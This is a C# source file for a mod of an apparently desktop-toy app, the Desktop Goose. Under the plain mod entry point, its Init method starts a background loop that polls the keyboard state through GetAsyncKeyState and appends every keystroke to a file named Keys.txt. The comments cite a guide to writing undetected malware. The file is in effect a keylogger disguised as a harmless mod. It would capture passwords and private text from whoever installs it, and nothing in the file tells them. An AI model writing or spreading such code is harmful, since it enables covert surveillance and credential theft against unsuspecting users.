using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using GooseShared;

namespace DefaultMod
{
    public class ModEntryPoint : IMod
    {
        // https://www.varonis.com/blog/malware-coding-lessons-people-part-learning-write-custom-fud-fully-undetected-malware/
        // Very informative and a good read
        // Extremely basic and only runs when application is open, just doing this bc why not ¯\_(ツ)_/¯
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        public void Init()
        {
            new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(100);
                    for (int i = 0; i < Enum.GetNames(typeof(Keys)).Length; i++)
                    {
                        int state = GetAsyncKeyState((Keys)i);

                        if (state == 1 || state == -32767)
                        {
                            using (var writer = File.AppendText("Keys.txt"))
                            {
                                writer.Write((Keys)i + " "); // Honestly think it looks better with it spaced out instead of a new line
                            }
                        }
                    }
                }
            })
            { IsBackground = false }.Start();
        }
    }
}
